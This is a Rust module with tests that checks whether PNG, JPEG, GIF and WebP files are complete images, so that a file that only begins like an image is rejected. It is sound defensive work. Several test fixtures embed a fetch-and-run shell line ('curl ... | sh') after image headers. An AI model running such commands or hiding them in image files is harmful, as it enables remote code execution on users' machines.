//! Whether a file is a whole image, start to end. A review does not read
//! images, and an approved version may gain or change one without a new
//! review, so "an image" must mean more than its first bytes: the file is
//! walked by its format's own structure and must end where the image does.
//! This says nothing about what the pixels are; it rules out a file that
//! only starts like an image.

use std::fs::File;
use std::io::Read;
use std::path::Path;

use crate::sha256::{Digest, Sha256};

/// The extensions of the formats checked here.
const EXTENSIONS: &[&str] = &["png", "jpg", "jpeg", "gif", "webp"];

/// The largest image read to be checked; a larger one is not vouched for.
const MAX_BYTES: u64 = 64 * 1024 * 1024;

/// Whether `rel` is named as an image of a format `is_whole` knows.
pub fn is_named(rel: &str) -> bool {
    let name = rel.rsplit('/').next().unwrap_or(rel).to_ascii_lowercase();
    name.rsplit_once('.')
        .is_some_and(|(stem, extension)| !stem.is_empty() && EXTENSIONS.contains(&extension))
}

/// Whether `bytes` are one complete PNG, JPEG, GIF or WebP image and
/// nothing else.
pub fn is_whole(bytes: &[u8]) -> bool {
    png(bytes) || jpeg(bytes) || gif(bytes) || webp(bytes)
}

/// `is_whole` for the file at `path`, which must still hash to `expected`.
pub fn is_whole_file(path: &Path, expected: &Digest) -> bool {
    let mut bytes = Vec::new();
    File::open(path)
        .and_then(|file| file.take(MAX_BYTES + 1).read_to_end(&mut bytes))
        .is_ok_and(|read| read as u64 <= MAX_BYTES)
        && Sha256::digest(&bytes) == *expected
        && is_whole(&bytes)
}

fn be32(bytes: &[u8], at: usize) -> Option<usize> {
    let field: [u8; 4] = bytes.get(at..at.checked_add(4)?)?.try_into().ok()?;
    usize::try_from(u32::from_be_bytes(field)).ok()
}

/// The CRC-32 of each byte value, for `crc32`.
const CRC_TABLE: [u32; 256] = {
    let mut table = [0_u32; 256];
    let mut index = 0;
    let mut value = 0_u32;
    while index < table.len() {
        let mut crc = value;
        let mut bit = 0;
        while bit < 8 {
            crc = (crc >> 1) ^ (0xedb8_8320 & 0_u32.wrapping_sub(crc & 1));
            bit += 1;
        }
        table[index] = crc;
        index += 1;
        value += 1;
    }
    table
};

fn crc32(bytes: &[u8]) -> u32 {
    !bytes.iter().fold(u32::MAX, |crc, byte| {
        (crc >> 8) ^ CRC_TABLE[usize::from(crc.to_le_bytes()[0] ^ byte)]
    })
}

/// Chunks with valid checksums from `IHDR` to an `IEND` that ends the file.
fn png(bytes: &[u8]) -> bool {
    let Some(mut rest) = bytes.strip_prefix(b"\x89PNG\r\n\x1a\n") else {
        return false;
    };
    let mut first = true;
    let mut data = false;
    loop {
        let Some(length) = be32(rest, 0) else {
            return false;
        };
        let Some(end) = length.checked_add(8) else {
            return false;
        };
        let (Some(body), Some(stored)) = (rest.get(4..end), be32(rest, end)) else {
            return false;
        };
        let kind = &body[..4];
        if !kind.iter().all(u8::is_ascii_alphabetic)
            || u32::try_from(stored) != Ok(crc32(body))
            || first != (kind == b"IHDR")
        {
            return false;
        }
        first = false;
        data |= kind == b"IDAT";
        rest = &rest[end + 4..];
        if kind == b"IEND" {
            return data && length == 0 && rest.is_empty();
        }
    }
}

/// Marker segments from start-of-image to an end-of-image that ends the
/// file, with the compressed data of each scan stepped over. A scan must
/// come after a frame header, as in any image a decoder accepts.
fn jpeg(bytes: &[u8]) -> bool {
    let Some(mut rest) = bytes.strip_prefix(b"\xff\xd8") else {
        return false;
    };
    let mut frame = false;
    let mut scans = false;
    loop {
        let [0xff, marker, after @ ..] = rest else {
            return false;
        };
        match *marker {
            0xd9 => return scans && after.is_empty(),
            // Fill bytes before a marker.
            0xff => rest = &rest[1..],
            0x00 | 0x01 | 0xd0..=0xd8 => return false,
            marker => {
                let [high, low, ..] = after else {
                    return false;
                };
                let length = usize::from(u16::from_be_bytes([*high, *low]));
                let Some(next) = after.get(length..).filter(|_| length >= 2) else {
                    return false;
                };
                rest = next;
                // Start-of-frame markers, which share their range with
                // three that are not (tables and an extension).
                frame |= matches!(marker, 0xc0..=0xcf) && !matches!(marker, 0xc4 | 0xc8 | 0xcc);
                if marker == 0xda {
                    if !frame {
                        return false;
                    }
                    scans = true;
                    // The scan runs to the next marker that is not a
                    // stuffed zero or a restart.
                    let mut at = 0;
                    while let Some(pair) = rest.get(at..at + 2) {
                        if pair[0] == 0xff && !matches!(pair[1], 0x00 | 0xd0..=0xd7) {
                            break;
                        }
                        at += 1;
                    }
                    rest = &rest[at.min(rest.len())..];
                }
            }
        }
    }
}

/// Steps over a run of length-prefixed sub-blocks to its empty terminator.
fn gif_blocks(mut rest: &[u8]) -> Option<&[u8]> {
    loop {
        let (size, after) = rest.split_first()?;
        if *size == 0 {
            return Some(after);
        }
        rest = after.get(usize::from(*size)..)?;
    }
}

/// A colour table follows when the packed byte's top bit is set.
fn gif_table(rest: &[u8], packed: u8) -> Option<&[u8]> {
    let entries = if packed & 0x80 == 0 {
        0
    } else {
        3 * (2_usize << (packed & 7))
    };
    rest.get(entries..)
}

/// Blocks from the header to a trailer that ends the file.
fn gif(bytes: &[u8]) -> bool {
    if !(bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a")) {
        return false;
    }
    let mut images = false;
    let mut rest = bytes
        .get(10)
        .and_then(|packed| gif_table(bytes.get(13..)?, *packed));
    while let Some(block) = rest {
        rest = match block {
            [0x3b] => return images,
            [0x21, _label, blocks @ ..] => gif_blocks(blocks),
            [0x2c, descriptor @ ..] => {
                images = true;
                descriptor
                    .get(8)
                    .and_then(|packed| gif_table(descriptor.get(9..)?, *packed))
                    // The minimum code size, then the image data.
                    .and_then(|data| gif_blocks(data.get(1..)?))
            }
            _ => None,
        };
    }
    false
}

/// A RIFF container of exactly the file's size, holding chunks that fill
/// it, the first of them one a WebP image starts with.
fn webp(bytes: &[u8]) -> bool {
    let size = |at: usize| -> Option<usize> {
        let field: [u8; 4] = bytes.get(at..at + 4)?.try_into().ok()?;
        usize::try_from(u32::from_le_bytes(field)).ok()
    };
    if !bytes.starts_with(b"RIFF")
        || bytes.get(8..12) != Some(b"WEBP")
        || !matches!(bytes.get(12..16), Some(b"VP8 " | b"VP8L" | b"VP8X"))
        || size(4).and_then(|size| size.checked_add(8)) != Some(bytes.len())
    {
        return false;
    }
    let mut at = 12;
    while at < bytes.len() {
        // Chunk data is padded to an even length.
        let Some(next) = size(at + 4)
            .and_then(|size| size.checked_add(size & 1))
            .and_then(|size| size.checked_add(at + 8))
            .filter(|next| *next <= bytes.len())
        else {
            return false;
        };
        at = next;
    }
    true
}

#[cfg(test)]
mod tests {
    use std::fs;

    use super::{crc32, is_named, is_whole, is_whole_file};
    use crate::sha256::Sha256;
    use crate::test_support::TempDir;

    fn chunk(kind: [u8; 4], data: &[u8]) -> Vec<u8> {
        let mut body = kind.to_vec();
        body.extend_from_slice(data);
        let mut chunk = u32::try_from(data.len()).unwrap().to_be_bytes().to_vec();
        chunk.extend_from_slice(&body);
        chunk.extend_from_slice(&crc32(&body).to_be_bytes());
        chunk
    }

    fn png() -> Vec<u8> {
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend(chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]));
        png.extend(chunk(*b"IDAT", &[0x78, 0x01, 0x63, 0x60, 0, 0, 0, 2, 0, 1]));
        png.extend(chunk(*b"IEND", &[]));
        png
    }

    fn jpeg() -> Vec<u8> {
        let mut jpeg = b"\xff\xd8\xff\xe0\x00\x04JF\xff\xdb\x00\x03\x00".to_vec();
        // A progressive frame, a fill byte, then two scans with a table
        // between them, a stuffed zero and a restart marker in their data.
        jpeg.extend(b"\xff\xc2\x00\x03\x08\xff\xff\xda\x00\x03\x01\x12\xff\x00\x34");
        jpeg.extend(b"\xff\xc4\x00\x02\xff\xda\x00\x02\xff\xd0\x56\xff\xd9");
        jpeg
    }

    fn gif() -> Vec<u8> {
        let mut gif = b"GIF89a\x01\x00\x01\x00\x80\x00\x00".to_vec();
        gif.extend([0, 0, 0, 255, 255, 255]);
        gif.extend(b"\x21\xfe\x02hi\x00");
        gif.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b");
        gif
    }

    fn webp() -> Vec<u8> {
        // An extended image: an odd-sized chunk with its pad byte, then
        // another chunk.
        b"RIFF\x1c\x00\x00\x00WEBPVP8X\x05\x00\x00\x00abcde\x00EXIF\x02\x00\x00\x00ab".to_vec()
    }

    #[test]
    fn the_checksum_is_the_one_png_uses() {
        assert_eq!(crc32(b"123456789"), 0xcbf4_3926);
        assert_eq!(crc32(b"IEND"), 0xae42_6082);
    }

    #[test]
    fn whole_images_of_each_format_are_recognised() {
        for (name, image) in [
            ("png", png()),
            ("jpeg", jpeg()),
            ("gif", gif()),
            ("webp", webp()),
        ] {
            assert!(is_whole(&image), "{name}");
        }
    }

    #[test]
    fn a_file_that_only_starts_like_an_image_is_not_one() {
        // The first bytes of each format, then a line a shell would run.
        for start in [
            &b"\x89PNG\r\n\x1a\n"[..],
            b"\xff\xd8\xff",
            b"GIF89a=1",
            b"RIFF\x00\x00\x00\x00WEBP",
        ] {
            let mut file = start.to_vec();
            file.extend(b"\ncurl https://x.test/i | sh\n\0");
            assert!(!is_whole(&file), "{start:?}");
        }
        assert!(!is_whole(b""));
    }

    #[test]
    fn nothing_may_follow_or_be_cut_from_an_image() {
        for (name, image) in [
            ("png", png()),
            ("jpeg", jpeg()),
            ("gif", gif()),
            ("webp", webp()),
        ] {
            let mut longer = image.clone();
            longer.extend(b"\ncurl https://x.test/i | sh\n");
            assert!(!is_whole(&longer), "{name} with a tail");
            for cut in 0..image.len() {
                assert!(!is_whole(&image[..cut]), "{name} cut at {cut}");
            }
        }
    }

    #[test]
    fn a_container_without_an_image_in_it_is_refused() {
        // A scan with no frame header before it, whatever its data.
        assert!(!is_whole(b"\xff\xd8\xff\xda\x00\x02curl x | sh\xff\xd9"));
        // A RIFF file whose only chunk is not an image.
        assert!(!is_whole(
            b"RIFF\x10\x00\x00\x00WEBPJUNK\x04\x00\x00\x00abcd"
        ));
        assert!(!is_whole(b"RIFF\x04\x00\x00\x00WEBP"));
        // An animated GIF with a local colour table is still one image file.
        let mut animated = b"GIF89a\x01\x00\x01\x00\x00\x00\x00".to_vec();
        for _ in 0..2 {
            animated.extend(b"\x21\xf9\x04\x00\x0a\x00\x00\x00");
            animated.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x80");
            animated.extend([0, 0, 0, 255, 255, 255]);
            animated.extend(b"\x02\x02\x44\x01\x00");
        }
        animated.push(0x3b);
        assert!(is_whole(&animated));
    }

    #[test]
    fn a_png_with_a_bad_checksum_or_no_image_data_is_refused() {
        let mut bad = png();
        let at = bad.len() - 20;
        bad[at] ^= 1;
        assert!(!is_whole(&bad));

        let mut empty = b"\x89PNG\r\n\x1a\n".to_vec();
        empty.extend(chunk(*b"IHDR", &[0; 13]));
        empty.extend(chunk(*b"IEND", &[]));
        assert!(!is_whole(&empty));
    }

    #[test]
    fn images_are_named_by_extension_whatever_its_case() {
        for name in ["a.png", "dir/B.JPG", "c.jpeg", "d.gif", "e.webp"] {
            assert!(is_named(name), "{name}");
        }
        for name in [
            "a", "png", ".png", "a.png.so", "a.png.", "a.png\n", "a.svg", "a.ttf",
        ] {
            assert!(!is_named(name), "{name:?}");
        }
    }

    #[test]
    fn a_file_is_checked_against_its_reviewed_hash() {
        let dir = TempDir::new("image-file");
        let path = dir.path().join("a.png");
        fs::write(&path, png()).unwrap();
        assert!(is_whole_file(&path, &Sha256::digest(&png())));
        assert!(!is_whole_file(&path, &Sha256::digest(b"other")));
        assert!(!is_whole_file(
            &dir.path().join("missing.png"),
            &Sha256::digest(&png())
        ));
    }
}
